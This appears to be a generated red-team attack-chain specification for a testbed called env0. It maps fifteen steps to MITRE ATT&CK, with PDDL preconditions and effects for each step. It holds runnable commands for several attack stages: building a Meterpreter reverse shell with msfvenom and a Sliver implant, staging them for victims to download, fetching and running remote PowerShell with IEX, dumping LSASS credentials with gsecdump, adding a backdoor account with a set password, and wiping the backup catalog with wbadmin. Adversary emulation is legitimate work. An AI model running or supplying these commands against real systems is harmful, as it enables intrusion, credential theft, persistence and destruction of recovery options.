# Chain 008

**Testbed**: `env0` · **Steps**: 15 · **Tactics touched**: Command and Control, Execution, Discovery, Credential Access, Persistence, Impact

## MITRE ATT&CK Coverage

| Tactic | Technique IDs |
|---|---|
| Command and Control | T1071.001 |
| Execution | T1071.001, T1204.002, T1059.003, T1059.001 |
| Discovery | T1018 |
| Credential Access | T1003 |
| Persistence | T1136.001 |
| Impact | T1490 |

## Attack Steps (Overview)

| # | Tactic | Technique | Action | Executor |
|---|---|---|---|---|
| 1 | Command and Control | T1071.001 | Build the executable file of a Meterpreter session (for Windows) using MSFVenom | MSFVenom Console |
| 2 | Execution, Command and Control | T1071.001 | Set an MSF payload handler for a file-backed payload | Metasploit Executor |
| 3 | Execution | T1204.002 | Simulate the victim download and execute malicious payload file | Human |
| 4 | Command and Control | T1071.001 | Execute a Meterpreter Payload | Meterpreter Session Establish |
| 5 | Discovery | T1018 | ARP Cache Inspection | Meterpreter Executor |
| 6 | Execution | T1204.002 | Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable as Admin | Human |
| 7 | Command and Control | T1071.001 | Execute a Meterpreter Payload | Meterpreter Session Establish |
| 8 | Execution | T1059.003 | Get an Interactive Shell on Windows | Meterpreter Session Derive |
| 9 | Command and Control | T1071.001 | Build the executable file of a Sliver implant (for Windows) | Sliver Console |
| 10 | Execution | T1204.002 | Simulate the victim download and execute malicious payload file as Admin (Root) | Human |
| 11 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 12 | Execution | T1059.001 | Execute PowerShell Command | Sliver Session Derive |
| 13 | Credential Access | T1003 | Gsecdump | Powershell Executor |
| 14 | Persistence | T1136.001 | Create a new user in a command prompt | Command Prompt Executor |
| 15 | Impact | T1490 | Windows - wbadmin Delete Windows Backup Catalog | Command Prompt Executor |

## Attack Steps (Detail)

### Step 1 — Build the executable file of a Meterpreter session (for Windows) using MSFVenom

- **UUID**: `msfvenom-1`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command uses MSFVenom to generate a payload designed for remote access to a target machine.

**Execution** (MSFVenom Console)

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f exe -o #{SAVE_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | no |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(meterpreter-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(standalone-exe-file ?file - file)`

---

### Step 2 — Set an MSF payload handler for a file-backed payload

- **UUID**: `set-msf-payload-handler-for-file`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution, Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Windows Command Shell, Ingress Tool Transfer, Non-Standard Por

**Description**

Same MSF `exploit/multi/handler` mechanism as `set-msf-payload-handler`, but
for the case where the meterpreter payload has been (or will be) staged as a
file on the victim.

This variant additionally grants `(callback-covered ?file)` for the payload's
file — the gate that every execute-* action requires before running that file.
Payload-genesis actions (msfvenom) deliberately do NOT produce
`callback-covered`, so payload files are born uncovered; firing this action
is what makes them safe to execute. This forces the planner to sequence
handler-set before any execute-* on the payload file — the ordering
constraint is encoded directly in PDDL preconditions.

Use `set-msf-payload-handler` (no file) for fileless delivery: reflective
loading, in-memory shellcode injection, staged callback with no on-disk
artifact.

**Execution** (Metasploit Executor)

```
exploit_and_execute_payload(exploit_module_name = "exploit/multi/handler",
                            payload_module_name = "#{payload_name}",
                            listening_host = "#{LHOST}",
                            listening_port = "#{LPORT}"):
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | no |
| `LPORT` | listening port of the attacter machine | — | no |
| `payload_name` | payload type set by msf | — | no |

**Preconditions**

- `(meterpreter-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`

**Effects**

- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 3 — Simulate the victim download and execute malicious payload file

- **UUID**: `simulate-download-execute-file`
- **Source**: Manual
- **Supported platforms**: windows, linux
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:8000 in the browser
2. Navigate to the path of the target payload file
3. Download the payload file
4. Execute the payload file to #{SAVE_PATH} (If on a Linux machine, you also need to chmod the file)
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`
- **or**(`(standalone-exe-file ?file - file)`, `(elf-file ?file - file)`)
- `(callback-covered ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`
- `(file-executed ?file - file ?target - host)`

---

### Step 4 — Execute a Meterpreter Payload

- **UUID**: `execute-meterpreter-payload-file`
- **Source**: Meterpreter
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Meterpreter payload will establish a Meterpreter session.

**Execution** (Meterpreter Session Establish)

```
None
```

**Preconditions**

- `(meterpreter-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(meterpreter-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 5 — ARP Cache Inspection

- **UUID**: `meterpreter-arp`
- **Source**: Metasploit
- **Supported platforms**: windows, linux
- **Tactics**: Discovery
- **MITRE ID(s)**: T1018
- **Technique(s)**: Remote System Discovery

**Description**

The `arp` command reads the ARP cache on the remote target to enumerate reachable hosts.

**Execution** (Meterpreter Executor)

```
arp(meterpreter_sessionid=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Meterpreter session ID of the active Metasploit connection. | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`)
- `(meterpreter-session ?executorID - executor ?target - host)`

**Effects**

- `(system-network-configuration-info-known ?target - host)`
- `(remote-system-info-known ?target - host)`

---

### Step 6 — Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable as Admin

- **UUID**: `simulate-execute-lnk-windows-root`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Description**

This step simulates the victim opening a `.lnk` shortcut whose target is a pre-staged executable **and the shortcut is configured / launched such that the target runs as Administrator** — either the shortcut's Properties → Advanced → "Run as administrator" flag is set, or the victim right-clicks the shortcut and selects "Run as administrator".

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, on the desktop or a folder)
Right-click a shortcut (.lnk) whose target is:
#{EXE_PATH}
then select "Run as administrator" (or open its Properties → Advanced → tick "Run as administrator", then double-click).
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `EXE_PATH` | Path of the executable the shortcut points at | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- `(os-windows ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(standalone-exe-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed-elevated ?file - file ?target - host)`

---

### Step 7 — Execute a Meterpreter Payload

- **UUID**: `execute-meterpreter-payload-file`
- **Source**: Meterpreter
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Meterpreter payload will establish a Meterpreter session.

**Execution** (Meterpreter Session Establish)

```
None
```

**Preconditions**

- `(meterpreter-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(meterpreter-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 8 — Get an Interactive Shell on Windows

- **UUID**: `meterpreter-shell-windows`
- **Source**: Metasploit
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.003
- **Technique(s)**: {'Command and Scripting Interpreter': 'Windows Command Shell'}

**Description**

The `shell` command in a Windows meterpreter session drops into an interactive cmd.exe.

**Execution** (Meterpreter Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Meterpreter session ID of the active Metasploit connection. | — | yes |
| `executor_parent` | Parent meterpreter session ID | — | yes |
| `executor_derived` | The derived Windows CMD executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(meterpreter-session ?executorID - executor ?target - host)`

**Effects**

- `(command-prompt ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 9 — Build the executable file of a Sliver implant (for Windows)

- **UUID**: `sliver-payload-windows-exe`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.

**Execution** (Sliver Console)

```
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(standalone-exe-file ?file - file)`
- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 10 — Simulate the victim download and execute malicious payload file as Admin (Root)

- **UUID**: `simulate-download-execute-file-root`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:#{LPORT} in the browser
2. Navigate to the path of the target payload file
3. Download the payload file
4. Execute the payload file to #{SAVE_PATH} as Admin (Root)
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`
- **or**(`(standalone-exe-file ?file - file)`, `(elf-file ?file - file)`)
- `(callback-covered ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`
- `(file-executed-elevated ?file - file ?target - host)`

---

### Step 11 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 12 — Execute PowerShell Command

- **UUID**: `sliver-powershell`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.001
- **Technique(s)**: Command and Scripting Interpreter: PowerShell


**Description**

The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows Powershell executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(powershell ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 13 — Gsecdump

- **UUID**: `art-t1003-gsecdump-lsass`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003
- **Technique(s)**: OS Credential Dumping

**Description**

Dumps active-session credentials from LSASS via gsecdump-v2b5 (TrueSec
legacy tool). Uses Method 3 (fold get_prereq_command from ART): the
action itself stages the binary from web.archive.org with SHA256
verification if not already present, then runs `gsecdump -a`. Precondition
is just a powershell session; no marker predicate for the binary. ART
auto_generated_guid 96345bfc-8ae7-4b6a-80b7-223200f24ef9.

**Execution** (Powershell Executor)

```
if (-not (Test-Path "#{gsecdump_exe}")) {
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  $parentpath = Split-Path "#{gsecdump_exe}"
  $binpath = "$parentpath\gsecdump-v2b5.exe"
  New-Item -ItemType Directory $parentpath -Force | Out-Null
  IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
  if (Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" "#{gsecdump_bin_hash}") {
    Move-Item $binpath "#{gsecdump_exe}"
  }
}
& "#{gsecdump_exe}" -a
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke the prereq + main command. | — | yes |
| `gsecdump_exe` | Local path on target where gsecdump binary should be staged and run. | C:\\Users\\Public\\gsecdump.exe | yes |
| `gsecdump_url` | Download URL for the gsecdump-v2b5 binary (web archive). | https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe | yes |
| `gsecdump_bin_hash` | Expected SHA256 of the gsecdump-v2b5.exe binary. | 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(credential-data ?d - data ?target - host)`
- `(data-stored-c2 ?d - data)`

---

### Step 14 — Create a new user in a command prompt

- **UUID**: `art-t1136_001-net-user-add`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Persistence
- **MITRE ID(s)**: T1136.001
- **Technique(s)**: Create Account: Local Account

**Description**

Creates a new local user account via `net user /add`. Standard
persistence pattern — attacker retains logon capability after
detection. Requires admin. ART auto_generated_guid
6657864e-0323-4206-9344-ac9cd7265a4f.

**Execution** (Command Prompt Executor)

```
net user /add "#{username}" "#{password}"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Command Prompt session ID used to invoke net user. | — | yes |
| `username` | Local account name to create. | BackupSvc | yes |
| `password` | Password for the new account. | ComplexPass!23 | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(command-prompt ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(user-created ?u - user ?target - host)`

---

### Step 15 — Windows - wbadmin Delete Windows Backup Catalog

- **UUID**: `art-t1490-wbadmin-delete-catalog`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Impact
- **MITRE ID(s)**: T1490
- **Technique(s)**: Inhibit System Recovery

**Description**

`wbadmin delete catalog -quiet` wipes the Windows Backup Catalog,
preventing the built-in Backup and Restore utility from restoring
from prior backup images. Complements shadow-copy deletion for a
full "no rollback" impact posture. ART auto_generated_guid
263ba6cb-ea2b-41c9-9d4e-b652dadd002c.

**Execution** (Command Prompt Executor)

```
wbadmin delete catalog -quiet
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Command Prompt session ID used to invoke wbadmin. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(command-prompt ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(inhibit-system-recovery ?target - host)`

---
